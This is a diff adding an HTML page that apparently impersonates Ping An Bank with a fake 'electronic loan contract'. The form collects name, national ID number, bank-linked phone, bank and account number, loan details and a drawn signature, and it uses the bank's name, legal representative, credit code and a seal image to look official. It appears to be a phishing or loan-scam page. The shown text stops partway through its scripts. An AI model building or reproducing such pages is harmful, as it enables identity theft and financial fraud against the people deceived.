@@ -1,0 +1,1134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1"/>
+    <title>&#x5e73;&#x5b89;&#x94f6;&#x884c;&#x80a1;&#x4efd;&#x6709;&#x9650;&#x516c;&#x53f8;</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        img {
+            max-width: 100%;
+            vertical-align: middle;
+        }
+
+        li {
+            list-style: none;
+        }
+
+        em {
+            font-style: normal;
+        }
+
+        body {
+            background: #dcdcdc;
+            font-size: 13px;
+            font-family: "Arimo", sans-serif !important;
+            letter-spacing: 0.3px;
+            color: #444;
+            padding-bottom: 20px;
+        }
+
+        .outer {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 15px;
+        }
+
+        .container {
+            background: #fff;
+            box-shadow: 0 0 0 0.5px rgba(0, 20, 40, .1), 0 2px 8px 0 rgba(50, 55, 90, .2);
+            -webkit-border-radius: 3px;
+            -moz-border-radius: 3px;
+            border-radius: 3px;
+            padding: 0 30px;
+        }
+
+        .title {
+            font-size: 1em;
+            text-align: center;
+            font-weight: normal;
+            color: #222;
+        }
+
+        .desc {
+            text-align: right;
+            font-size: .8em;
+            color: #7c7c7c;
+            padding-top: 5px;
+        }
+
+        .ul > li {
+            padding: 10px 0;
+            margin: 5px 0;
+            position: relative;
+        }
+
+        .labelName {
+            padding-bottom: 8px;
+            display: block;
+            font-size: 15px;
+            color: #222;
+        }
+
+        .important {
+            color: #f00 !important;
+        }
+
+        input[type=text] {
+            border-radius: 3px;
+            padding: 8px 5px 8px 5px;
+            font-size: 13px;
+            border: 1px solid #a5a5a5 !important;
+            width: 100%;
+        }
+
+        .warningMessage {
+            font: 12px Arial, Arimo, Helvetica, sans-serif;
+            color: #ff0000;
+            padding-top: 5px;
+            display: none;
+            word-wrap: break-word;
+        }
+
+        .instruction {
+            color: #7c7c7c;
+            font-size: 13px !important;
+            font-style: normal;
+            margin-top: 3px;
+            overflow: visible !important;
+            line-height: 1.5;
+            margin-bottom: 3px;
+        }
+
+        .termsAccept {
+            margin-top: 2px !important;
+        }
+
+        input[type=radio] {
+            vertical-align: middle;
+        }
+
+        .termsAccept input[type="checkbox"] {
+            margin-top: 3px !important;
+            float: left;
+            display: block;
+            height: 13px;
+            margin: 4px 0 0;
+            padding: 0;
+            width: 13px;
+        }
+
+        .customCheckBox .cusChoiceLabel {
+            display: block;
+            cursor: pointer;
+            margin: 0 !important;
+            position: relative;
+        }
+
+        .customCheckBox input[type="checkbox"] + .cusChoiceLabel:before {
+            content: '';
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            vertical-align: -0.25em;
+            border-radius: 2px;
+            border: 1px solid #9e9e9e;
+            margin: 0;
+            top: 0;
+            -webkit-transition: 0.5s ease all;
+            -moz-transition: 0.5s ease all;
+            -o-transition: 0.5s ease all;
+            -ms-transition: 0.5s ease all;
+            transition: 0.5s ease all;
+            float: left;
+        }
+
+        .customCheckBox input[type="checkbox"]:checked + .cusChoiceLabel:after {
+            display: inline-block;
+            -webkit-transform: rotate(45deg);
+            -moz-transform: rotate(45deg);
+            -o-transform: rotate(45deg);
+            -ms-transform: rotate(45deg);
+            transform: rotate(45deg);
+            height: 8px;
+            width: 3px;
+            margin-bottom: 0;
+            border-bottom: 2px solid #24A68A;
+            border-right: 2px solid #24A68A;
+            content: "";
+            position: absolute;
+            left: 7px !important;
+            -webkit-transition: 0.5s ease all;
+            -moz-transition: 0.5s ease all;
+            -o-transition: 0.5s ease all;
+            -ms-transition: 0.5s ease all;
+            transition: 0.5s ease all;
+            top: 5px;
+        }
+
+        .termsAccept.customCheckBox input[type="checkbox"]:checked + .cusChoiceLabel:after {
+            top: 3px;
+        }
+
+        .customCheckBox input[type="checkbox"]:checked, .customCheckBox input[type="checkbox"]:not(:checked) {
+            position: absolute;
+            opacity: 0;
+        }
+
+        .termsAccept .descFld {
+            margin-left: 26px;
+            font-size: 13px;
+            float: none;
+            display: block;
+            cursor: default;
+        }
+
+        .date .tempContDiv input[type="text"] {
+            float: left;
+            margin-right: 0px;
+            width: 100%;
+        }
+
+        .calIconWrapper {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .calendarCont .calIconWrapper {
+            width: 16px;
+            padding-left: 8px;
+        }
+
+        .clearBoth {
+            clear: both;
+        }
+
+        .calendarCont {
+            display: table;
+            width: 50%;
+        }
+
+        .formSubInfoText {
+            margin-left: 2px;
+        }
+
+        .date .tempContDiv label {
+            color: #7c7c7c;
+            font-size: 13px !important;
+        }
+
+        .date .tempContDiv span label {
+            display: block;
+            padding-top: 3px;
+            text-align: left;
+        }
+
+        .signContainer canvas {
+            cursor: crosshair;
+            border: 1px solid #d6d8d9;
+            -webkit-border-radius: 2px;
+            -moz-border-radius: 2px;
+            border-radius: 2px;
+            display: block;
+            background: #fff;
+        }
+
+        .signContainer a {
+            font-size: 13px;
+            text-decoration: underline;
+            display: inline-block;
+            color: #24A68A;
+        }
+
+        .fmFooter {
+            text-align: center;
+        }
+
+        .fmSmtButton {
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            padding: 10px 40px 10px 40px;
+            font-weight: 400;
+            -webkit-border-radius: 3px;
+            -moz-border-radius: 3px;
+            border-radius: 3px;
+            font-size: 15px;
+            font-family: "Arimo", sans-serif;
+        }
+
+        .submitColor {
+            color: #fff;
+            border: 1px solid;
+            border-color: #24A68A;
+            background: #24A68A;
+            -moz-box-shadow: 0 1px 2px rgba(0, 0, 0, 0.15);
+            -webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.15);
+            text-shadow: 0 1px 0 rgba(0, 0, 0, 0.25);
+        }
+
+        .signContainer canvas:focus {
+            border: 1px solid #24A68A !important;
+            outline: none;
+        }
+
+        .errorMessage {
+            font: 12px Arial, Arimo, Helvetica, sans-serif;
+            color: #ff0000;
+            padding-top: 5px;
+            display: none;
+            word-wrap: break-word;
+        }
+
+        .dim-div1 {
+            display: block;
+            height: 100%;
+            left: 0;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 500;
+        }
+
+        .splashMsgWrapper {
+            background: rgba(225, 225, 225, 0.5) !important;
+        }
+
+        .splashMsgWrapper .splashMsgOuterCont {
+            text-align: center;
+        }
+
+        .splashMsgWrapper .splashMsgCont {
+            display: inline-block;
+            padding: 15px 25px;
+            font-size: 13px;
+            background: #fff;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.7);
+            -moz-box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.7);
+            -webkit-box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.7);
+            -webkit-border-radius: 3px;
+            -moz-border-radius: 3px;
+            border-radius: 3px;
+            margin-left: 15px;
+            margin-right: 15px;
+            max-width: 600px;
+        }
+
+        .fmFooter {
+            padding: 25px 30px;
+        }
+
+        .dim-div {
+            display: block;
+            height: 100%;
+            left: 0;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            background: rgba(25, 35, 43, 0.85);
+            width: 100%;
+            z-index: 500;
+        }
+
+        .popUpOuter {
+            margin: 0 auto;
+            margin-top: 0%;
+            z-index: 999;
+        }
+
+        .popUpInner {
+            background: #fff;
+            -webkit-border-radius: 3px;
+            -moz-border-radius: 3px;
+            border-radius: 3px;
+            padding: 30px 30px 20px 30px;
+            height: 1%;
+            border: 1px solid #fff;
+        }
+
+        .popupHeader {
+            font-size: 17px;
+            color: #000;
+            padding: 0px 0px 15px;
+            font-weight: 500;
+        }
+
+        .popupHeader .rtAction {
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+            border: 1px solid #e7e7e7;
+            text-decoration: none;
+            background: #fff;
+            height: 10px;
+            padding: 5px;
+        }
+
+        .popupHeader .ppDeleteIcon {
+            margin-top: -16px;
+            margin-right: -16px;
+        }
+
+        .popupTemFot {
+            margin-top: 10px;
+            padding: 10px 0px;
+        }
+
+        .popupTemFot a {
+            text-decoration: none;
+            margin: 0 8px 0 2px;
+        }
+
+        .btnCurve {
+            display: inline-block;
+            outline: none;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 400;
+            padding: 7px 20px;
+            border-radius: 3px;
+        }
+
+        .lightGray {
+            color: #444;
+            border: solid 1px #ccc;
+            background: #F4F4F4;
+        }
+
+        .removeBdr {
+            border-bottom: none;
+            padding-bottom: 0px;
+        }
+
+        .removeBdr .ppDeleteIcon {
+            margin: 0;
+            padding: 0;
+            position: absolute;
+            right: 15px;
+            top: 15px;
+        }
+
+        .popupMainCont {
+            padding: 5px 0px;
+        }
+
+        .kjtx {
+            margin-bottom: 10px;
+        }
+
+        .kjtx a {
+            color: #2440b3;
+            padding: 0 7px;
+        }
+
+        @media only screen and (min-width: 1024px) {
+            .outer {
+                padding: 30px 10px;
+            }
+        }
+
+        @media only screen and (max-width: 475px) {
+            .date .tempContDiv .calendarCont {
+                width: 100% !important;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="outer">
+    <div class="container">
+        <img id="logo" src="statics/picture/____-1.png">
+        <h2 id="title" class="title">&#x5e73;&#x5b89;&#x94f6;&#x884c;&#x80a1;&#x4efd;&#x6709;&#x9650;&#x516c;&#x53f8;&#x7535;&#x5b50;&#x501f;&#x8d37;&#x5408;&#x540c;</h2>
+        <p class="desc">&#x5408;&#x540c;&#x7f16;&#x53f7;&#xff1a;<u>2024 </u><u id="dss"></u> 字 第 <u id="dsss">0569877</u> 号</p>
+        <div style="margin:20px -30px 0;border-bottom:1px solid #eaeaea;"></div>
+        <form>
+            <input type="hidden" name="hao" id="hao" value=""/>
+            <input type="hidden" name="riqi" id="riqi" value=""/>
+            <input type="hidden" name="url" id="url" value=""/>
+            <ul class="formFieldWrapper ul">
+                <li>
+                    <p style="margin-bottom:8px;font-weight:bold;">一.&#x501f;&#x6b3e;&#x65b9;&#xff08;&#x4ee5;&#x4e0b;&#x79f0;&#x7532;&#x65b9;&#xff09;</p>
+                    <label class="labelName">
+                        <span>&#x59d3;&#x540d;</span>
+                        <em class="important">*</em>
+                    </label>
+                    <input autocomplete="off" type="text" maxlength="255" name="SingleLine" value="" placeholder="">
+                    <p class="warningMessage">&#x8bf7;&#x8f93;&#x5165;&#x59d3;&#x540d;</p>
+                </li>
+                <li>
+                    <label class="labelName">
+                        <span>&#x8eab;&#x4efd;&#x8bc1;&#x53f7;&#x7801;</span>
+                        <em class="important">*</em>
+                    </label>
+                    <input autocomplete="off" type="text" maxlength="255" name="SingleLine2" value="" placeholder="">
+                    <p class="warningMessage">&#x8bf7;&#x8f93;&#x5165;&#x8eab;&#x4efd;&#x8bc1;&#x53f7;&#x7801;</p>
+                </li>
+                <li>
+                    <label class="labelName">
+                        <span>&#x94f6;&#x884c;&#x9884;&#x7559;&#x624b;&#x673a;&#x53f7;&#x7801;</span>
+                        <em class="important">*</em>
+                    </label>
+                    <input autocomplete="off" type="text" maxlength="255" name="SingleLine1" value="" placeholder="">
+                    <p class="warningMessage">&#x8bf7;&#x8f93;&#x5165;&#x94f6;&#x884c;&#x9884;&#x7559;&#x624b;&#x673a;&#x53f7;&#x7801;</p>
+                </li>
+                <li>
+                    <label class="labelName">
+                        <span>&#x6536;&#x6b3e;&#x94f6;&#x884c;&#x540d;&#x79f0;&#xff08;&#x5f00;&#x6237;&#x884c;&#xff09;</span>
+                        <em class="important">*</em>
+                    </label>
+                    <input autocomplete="off" type="text" maxlength="255" name="Dropdown" value="" placeholder="">
+                    <p class="warningMessage">&#x8bf7;&#x8f93;&#x5165;&#x6536;&#x6b3e;&#x94f6;&#x884c;&#x540d;&#x79f0;&#xff08;&#x5f00;&#x6237;&#x884c;&#xff09;</p>
+                    <p class="instruction">&#xff08;&#x9996;&#x9009;&#x4e2d;&#x56fd;&#x94f6;&#x884c;&#x002e;&#x519c;&#x4e1a;&#x94f6;&#x884c;&#x002e;&#x5de5;&#x5546;&#x94f6;&#x884c;&#x002e;&#x90ae;&#x653f;&#x94f6;&#x884c;&#x002e;&#x4ea4;&#x901a;&#x94f6;&#x884c;&#x002e;&#x5efa;&#x8bbe;&#x94f6;&#x884c;&#x002e;&#x4e00;&#x7c7b;&#x5361;&#x4f18;&#x9009;&#x4e0b;&#x6b3e;&#xff09;</p>
+                </li>
+                <li>
+                    <label class="labelName">
+                        <span>&#x6536;&#x6b3e;&#x8d26;&#x53f7;</span>
+                        <em class="important">*</em>
+                    </label>
+                    <input autocomplete="off" type="text" maxlength="255" name="SingleLine3" value="" placeholder="">
+                    <p class="warningMessage">&#x8bf7;&#x8f93;&#x5165;&#x6536;&#x6b3e;&#x8d26;&#x53f7;</p>
+                </li>
+                <li>
+                    <label class="labelName">
+                        <span>&#x8d37;&#x6b3e;&#x989d;&#x5ea6;</span>
+                        <em class="important">*</em>
+                        <span class="instruction"> &#x5ba1;&#x6279;&#x989d;&#x5ea6;&#xff08;&#x0031;&#x002d;&#x0031;&#x0030;&#x0030;&#x4e07;&#x5143;&#xff09;</span>
+                    </label>
+                    <p class="kjtx">快捷填写：<a>2万</a><a>5万</a><a>10万</a><a>20万</a><a>50万</a></p>
+                    <span style="float:right;padding:8px 10px 0 0;">&#x4e07;&#x5143;&#x4eba;&#x6c11;&#x5e01;&#x6574;</span><input
+                        autocomplete="off" type="text" maxlength="255" name="SingleLine4" value="" placeholder=""
+                        style="width:calc(100% - 100px)">
+                    <p class="warningMessage">&#x8bf7;&#x8f93;&#x5165;&#x8d37;&#x6b3e;&#x989d;&#x5ea6;</p>
+                    <p class="instruction">&#xff08;&#x4f8b;&#x5982;&#xff1a;&#x8d37;&#x6b3e;&#x0031;&#x4e07;&#x586b;&#x5199;&#x0031;&#x0020;&#x0020;&#x8d37;&#x6b3e;&#x0031;&#x0030;&#x4e07;&#x586b;&#x5199;&#x0031;&#x0030;&#x0020;&#xff09;</p>
+                </li>
+                <li>
+                    <label class="labelName">
+                        <span>&#x8d37;&#x6b3e;&#x671f;&#x9650;&#xff08;&#x671f;&#xff09;</span>
+                        <em class="important">*</em>
+                    </label>
+                    <input autocomplete="off" type="text" maxlength="255" name="SingleLine6" value="" placeholder="">
+                    <p class="warningMessage">&#x8bf7;&#x8f93;&#x5165;&#x8d37;&#x6b3e;&#x671f;&#x9650;</p>
+                    <p class="instruction">&#xff08;&#x671f;&#x9650;&#x53ef;&#x9009;&#xff1a;&#x0033;&#x002d;&#x0036;&#x002d;&#x0031;&#x0032;&#x002d;&#x0032;&#x0034;&#x002d;&#x0033;&#x0036;&#x002d;&#x0034;&#x0038;&#x002d;&#x0036;&#x0030;&#x002d;&#x0031;&#x0032;&#x0030;&#x671f;&#xff09;</p>
+                </li>
+                <li>
+                    <label class="labelName">
+                        <span>&#x8d37;&#x6b3e;&#x7528;&#x9014;</span>
+                        <em class="important">*</em>
+                    </label>
+                    <input autocomplete="off" type="text" maxlength="255" name="SingleLine5" value="" placeholder="">
+                    <p class="warningMessage">&#x8bf7;&#x8f93;&#x5165;&#x8d37;&#x6b3e;&#x7528;&#x9014;</p>
+                    <p class="instruction">&#xff08;&#x4f8b;&#x5982;&#xff1a;&#x623f;&#x5b50;&#x88c5;&#x4fee;&#xff0c;&#x6d88;&#x8d39;&#xff0c;&#x4e70;&#x623f;&#xff0c;&#x4e70;&#x8f66;&#x7b49;&#x7b49;&#xff09;</p>
+                </li>
+                <li>
+                    <label class="labelName">
+                        <span>&#x4ece;&#x4e8b;&#x884c;&#x4e1a;</span>
+                        <em class="important">*</em>
+                    </label>
+                    <input autocomplete="off" type="text" maxlength="255" name="SingleLine15" value="" placeholder="">
+                    <p class="warningMessage">&#x8bf7;&#x8f93;&#x5165;&#x4ece;&#x4e8b;&#x884c;&#x4e1a;</p>
+                </li>
+                <li>
+                    <label class="labelName">
+                        <span>&#x5c45;&#x4f4f;&#x5730;&#x5740;</span>
+                        <em class="important">*</em>
+                    </label>
+                    <input autocomplete="off" type="text" maxlength="255" name="SingleLine7" value="" placeholder="">
+                    <p class="warningMessage">&#x8bf7;&#x8f93;&#x5165;&#x5c45;&#x4f4f;&#x5730;&#x5740;</p>
+                    <p class="instruction">&#xff08;&#x4f8b;&#x5982;&#xff1a;&#x4e0a;&#x6d77;&#x5e02;&#x5f90;&#x6c47;&#x533a;&#x4e2d;&#x5c71;&#x897f;&#x8def;&#x0031;&#x0035;&#x0031;&#x0035;&#x53f7;&#xff09;</p>
+                </li>
+                <li>
+                    <label class="labelName">
+                        <span>&#x8fd8;&#x6b3e;&#x65b9;&#x5f0f;</span>
+                        <em class="important">*</em>
+                    </label>
+                    <div class="termsAccept" style="display: inline-block;width: 50%;">
+                        <label><input id="hkfs1" value="0" name="hkfs" type="radio" checked="checked"> &nbsp;&nbsp;&#x5148;&#x606f;&#x540e;&#x672c;</label>
+                    </div>
+                    <div class="termsAccept" style="display: inline-block;width: 50%;">
+                        <label><input id="hkfs2" value="1" name="hkfs" type="radio"> &nbsp;&nbsp;&#x7b49;&#x989d;&#x672c;&#x606f;</label>
+                    </div>
+                </li>
+                <li tabindex="1" id="HtmlText2-li" class="tempFrmWrapper note" elname="livefield-elem"
+                    compname="HtmlText2" comptype="0" page_no="1" page_link_name="Page"><p style="margin-bottom:10px;">
+                    <strong style="font-weight:bold;">二.&#x653e;&#x6b3e;&#x65b9;&#xff08;&#x4ee5;&#x4e0b;&#x79f0;&#x4e59;&#x65b9;&#xff09;</strong>
+                </p>
+                    <p>&#x653e;&#x6b3e;&#x65b9;：<u id="dkname">&#x5e73;&#x5b89;&#x94f6;&#x884c;&#x80a1;&#x4efd;&#x6709;&#x9650;&#x516c;&#x53f8;&#x0020;</u>
+                    </p>
+                    <p>地 址： <u id="zcaddress">&#x6df1;&#x5733;&#x5e02;&#x7f57;&#x6e56;&#x533a;&#x6df1;&#x5357;&#x4e1c;&#x8def;&#x0035;&#x0030;&#x0034;&#x0037;&#x53f7; </u>
+                    </p>
+                    <p>&#x6cd5;&#x5b9a;&#x4ee3;&#x8868;&#x4eba;：<u id="faren">&#x8c22;&#x6c38;&#x6797;</u><img src=""
+                                                                                             style="width: 50px; vertical-align: middle; max-width: 295.2px;">
+                        <!--<img src="statics/picture/手印1.png" style="width:50px;position: absolute;
+                            left: 150px;
+                            top: 51px;">
+                            <img src="statics/picture/个人印章.png" style="width:50px;position: absolute;
+                            left: 150px;
+                            top: 71px;">-->
+                    </p>
+                    <p>&#x5de5;&#x5546;&#x5c40;&#x7edf;&#x4e00;&#x793e;&#x4f1a;&#x4fe1;&#x7528;&#x4ee3;&#x7801;：<u id="dkcode">91440300192185379H</u>
+                    </p>
+
+                    <p>*&#x6839;&#x636e;&#x300a;&#x4e2d;&#x534e;&#x4eba;&#x6c11;&#x5171;&#x548c;&#x56fd;&#x5408;&#x540c;&#x6cd5;&#x300b;&#x7684;&#x89c4;&#x5b9a;&#xff0c;&#x7ecf;&#x7532;&#x4e59;&#x53cc;&#x65b9;&#x534f;&#x5546;&#x4e00;&#x81f4;&#xff0c;&#x7b7e;&#x8ba2;&#x672c;&#x5408;&#x540c;&#x3001;&#x5171;&#x540c;&#x4fe1;&#x5b88;&#x3001;&#x672c;&#x5408;&#x540c;&#x5177;&#x6709;&#x540c;&#x7b49;&#x7684;&#x6cd5;&#x5f8b;&#x6548;&#x5e94;&#x3002;</p>
+                    <img id="hetongimag" src="statics/picture/____-2.png" style="width: 100px;
+    position: absolute;
+    right: 0;
+    top: 2px;
+    max-width: 295.2px;
+    transform: rotate(-45deg);">
+                    <div class="clearBoth"></div>
+                </li>
+                <li tabindex="1" id="HtmlText2-li" class="tempFrmWrapper note" elname="livefield-elem"
+                    compname="HtmlText2" comptype="0" page_no="1" page_link_name="Page"><p
+                        style="margin-bottom:8px;font-weight:bold;">三.&#x5408;&#x540c;&#x6761;&#x6b3e;</p><label
+                        class="descFld">
+                    <div><b><span class="size" style="font-size: 13.3333px">第一条.</span></b><span class="highlight"
+                                                                                                 style="background-color: rgb(255, 255, 255)"><span
+                            class="colour" style="color: rgb(51, 51, 51)"><span class="font"
+                                                                                style="font-family: &quot;Microsoft Yahei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Helvetica Neue&quot;, Helvetica, tahoma, arial, &quot;WenQuanYi Micro Hei&quot;, Verdana, sans-serif, 宋体"><span
+                            class="size" style="background-color: inherit; font-size: 13.3333px">&#x501f;&#x6b3e;&#x7c7b;&#x578b;&#xff1a;&#x5c0f;&#x989d;&#x65e0;&#x62b5;&#x62bc;&#x4fe1;&#x7528;&#x8d37;&#x6b3e;&#x3002;<br>&#x501f;&#x6b3e;&#x91d1;&#x989d;（大写）：<span
+                            id="moneybig">0.00</span>（小写）：<span id="money">0.00</span>&#x5143;&#x4eba;&#x6c11;&#x5e01;&#x3002;&#x8d37;&#x6b3e;&#x7528;&#x9014;：<span
+                            id="yongtu"></span>。&#x4ece;&#x4e8b;&#x884c;&#x4e1a;：<span
+                            id="hangye"></span>。</span></span></span></span> <br></div>
+                </label>
+                    <div class="clearBoth"></div>
+                </li>
+                <li tabindex="1" id="HtmlText4-li" class="tempFrmWrapper note" elname="livefield-elem"
+                    compname="HtmlText4" comptype="0" page_no="1" page_link_name="Page"><label class="descFld">
+                    <div><span
+                            style="color: rgb(51, 51, 51); font-family: &quot;Microsoft Yahei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Helvetica Neue&quot;, Helvetica, tahoma, arial, &quot;WenQuanYi Micro Hei&quot;, Verdana, sans-serif, 宋体; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); text-decoration-color: initial; display: inline !important; float: none"><span
+                            class="size" style="font-size: 13.3333px"><b>第二条.</b>&#x8d37;&#x6b3e;&#x5229;&#x606f;&#xff1a;&#x6309;&#x6708;&#x652f;&#x4ed8;&#x5229;&#x606f;<span
+                            id="yll">0.45</span>厘。</span></span> <br></div>
+                </label>
+                    <div class="clearBoth"></div>
+                </li>
+                <li tabindex="1" id="HtmlText5-li" class="tempFrmWrapper note" elname="livefield-elem"
+                    compname="HtmlText5" comptype="0" page_no="1" page_link_name="Page"><label class="descFld">
+                    <div><span
+                            style="color: rgb(51, 51, 51); font-family: &quot;Microsoft Yahei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Helvetica Neue&quot;, Helvetica, tahoma, arial, &quot;WenQuanYi Micro Hei&quot;, Verdana, sans-serif, 宋体; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); text-decoration-color: initial; display: inline !important; float: none"><span
+                            class="size" style="font-size: 13.3333px;line-height:1.4"><b>第三条.</b>&#x8fd8;&#x6b3e;&#x65b9;&#x5f0f;&#xff1a;&#x0031;&#x002e;&#x624b;&#x52a8;&#x8fd8;&#x6b3e;&#x0020;&#x5148;&#x606f;&#x540e;&#x672c; <input
+                            type="checkbox" id="hkfs12" name="hkfs2" value="0" checked=""> 2.&#x7b49;&#x989d;&#x672c;&#x606f; <input
+                            type="checkbox" id="hkfs22" name="hkfs2" value="1">&#xff08;&#x9ed8;&#x8ba4;&#x5148;&#x606f;&#x540e;&#x672c;&#xff0c;&#x6ee1;&#x0031;&#x4e2a;&#x6708;&#x5373;&#x53ef;&#x63d0;&#x524d;&#x8fd8;&#x6b3e;&#xff09;</span></span>
+                        <br></div>
+                </label>
+                    <div class="clearBoth"></div>
+                </li>
+                <li tabindex="1" id="HtmlText6-li" class="tempFrmWrapper note" elname="livefield-elem"
+                    compname="HtmlText6" comptype="0" page_no="1" page_link_name="Page"><label class="descFld">
+                    <div><span
+                            style="color: rgb(51, 51, 51); font-family: &quot;Microsoft Yahei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Helvetica Neue&quot;, Helvetica, tahoma, arial, &quot;WenQuanYi Micro Hei&quot;, Verdana, sans-serif, 宋体; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); text-decoration-color: initial; display: inline !important; float: none"><span
+                            class="size" style="font-size: 13.3333px;line-height:1.4"><b>第四条.</b>&#x8d37;&#x6b3e;&#x671f;&#x9650;：<u
+                            id="y1">2024</u>年<u id="m1">04</u>月<u id="d1">13</u>日起至<u id="y2">2024</u>年<u id="m2">04</u>月<u
+                            id="d2">13</u>日止，共计<u id="m3">0</u>期</span></span>。 <br></div>
+                </label>
+                    <div class="clearBoth"></div>
+                </li>
+                <li tabindex="1" class="tempFrmWrapper note" elname="livefield-elem" compname="HtmlText6" comptype="0"
+                    page_no="1" page_link_name="Page">
+
+                    <div id="xyDiv"></div>
+
+                </li>
+
+                <li>
+                    <div class="termsAccept customCheckBox">
+                        <input id="TermsConditions-input" class="checkBoxType flLeft" name="TermsConditions"
+                               type="checkbox">
+
+                        <!-- declaration content moved to div from label to make custom choices work -->
+                        <label class="cusChoiceLabel" for="TermsConditions-input">
+                            <div class="checker"></div>
+                        </label>
+
+
+                        <div class="descFld">我接受条款与条件。</div>
+                        <p class="errorMessage" elname="error" id="error-TermsConditions" style="">您必须接受“条款和条件”</p>
+                    </div>
+                </li>
+                <li isunique="false" class="tempFrmWrapper date" tabindex="1" elname="livefield-elem" comptype="5"
+                    id="Date-li" compname="Date" linkname="Date" needdata="true" isvisible="true" disableddays="{}"
+                    startoftheweek="0" mandatory="true" page_no="1" page_link_name="Page" showlabel="true">
+                    <label class="labelName">
+                        <span>日期</span>
+                        <em class="important">*</em>
+                    </label>
+                    <div class="tempContDiv" datelocale="zh-CN" elname="yy/mm/dd" id="DatedateDiv" isdisable="false">
+<span> <div class="calendarCont"> 
+<input name="Date" elname="date" id="Date-date" type="text" value="" placeholder="" class="hasDatepicker"><div
+        class="calIconWrapper" elname="imgWrapDiv"><img class="calendarIcon"
+                                                        src="statics/picture/spacer.325472601571f31e1bf00674c368d335.gif"
+                                                        title="..."></div>
+<div class="clearBoth"></div></div><label class="formSubInfoText">yyyy/MM/dd</label> </span>
+                        <p class="errorMessage" elname="error" id="error-Date"></p>
+                    </div>
+                </li>
+                <li class="sign tempFrmWrapper" tabindex="1" elname="livefield-elem" comptype="25" id="Signature-li"
+                    needdata="true" compname="Signature" linkname="Signature" isvisible="true" mandatory="true"
+                    page_no="1" page_link_name="Page">
+                    <label class="labelName"><span>签名</span>
+                        <em class="important">*</em>
+                    </label>
+                    <div class="tempContDiv">
+                        <div class="signContainer" elname="signContainer" id="signContainer-Signature">
+                            <canvas id="drawingCanvas-Signature" signaturefieldparent="form" tabindex="-1"
+                                    width="285"></canvas>
+                            <input type="hidden" name="Signature" id="Signature" value=""/>
+                            <div class="signArea" elname="signArea" id="sign-area-Signature" style="display:none"></div>
+                            <a id="clearSign" elname="clearSign" class="instrSpace" href="javascript:void(0);"
+                               onclick="clearSignature('drawingCanvas-Signature');">清除</a></div>
+                        <p class="errorMessage" elname="error" id="error-Signature" style="">在这里添加您的签名。</p>
+                        <p class="instruction instrSpace" elname="hint" id="hint-Signature"> 点击空白窗口进行签署↑↑↑ </p>
+                    </div>
+                    <div class="clearBoth"></div>
+                </li>
+            </ul>
+        </form>
+        <ul elname="footer" class="footerWrapper formRelative" page_no="1" page_count="1" page_link_name="Page">
+            <li style="overflow:visible; position: relative;" class="btnAllign fmFooter" id="formAccess" elname="0">
+                <div class="pageFotDef">
+                    <div class="alignSubmit">
+                        <div class="formRelative inlineBlock submitBtnCont">
+                            <button class="fmSmtButton submitColor submitWrapper fmSmtButtom" elname="submit"
+                                    value="submit">
+                                <em>提交</em>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div class="clearBoth"></div>
+            </li>
+        </ul>
+    </div>
+</div>
+<div id="splash_message_div" style="display: none;" class="dim-div1 splashMsgWrapper">
+    <div id="splash_message_div_cont" class="splashMsgOuterCont"><span id="splash_msg_text"
+                                                                       class="splashMsgCont"> </span></div>
+</div>
+<div class="dim-div" style="display:none;" id="settingsErr-div">
+    <div class="popUpOuter" style="width: 370px; position: absolute; top: 131px; left: 489.5px;"
+         id="settingsErr-div-cont">
+        <div class="popUpInner">
+            <div class="popupHeader removeBdr"><a href="javascript:;" onclick="closeErrorPopup();"
+                                                  class="flRight ppDeleteIcon"></a>
+                <div class="clearBoth"></div>
+            </div>
+            <div class="popupMainCont">
+                <div class="popUpFields"><label id="popHeader"></label>
+                    <div id="msgBody"></div>
+                </div>
+            </div>
+            <div class="popupTemFot" style="text-align: center"><a href="javascript:;" onclick="closeErrorPopup();"
+                                                                   class="btnCurve lightGray">确定</a></div>
+        </div>
+    </div>
+</div>
+<script src="statics/js/jquery-1.9.1.min.js"></script>
+<script src="statics/js/ge2tlink.js"></script>
+<script src="statics/js/base_pwd.js"></script>
+<script>
+    function allLinesMatch(lines, pattern) {
+        return lines.every(line => line === pattern);
+    }
+</script>
+<script>
+    //dm += 'hyll5';
+    dm += '';
+</script>
+<script>
+    const currentDate = new Date();
+    // 获取当前月份（0-11，0代表1月，11代表12月）
+    const currentMonth = currentDate.getMonth() + 1; // 加1因为getMonth()返回的是从0开始的数字
+    // 获取当前日期（1-31）
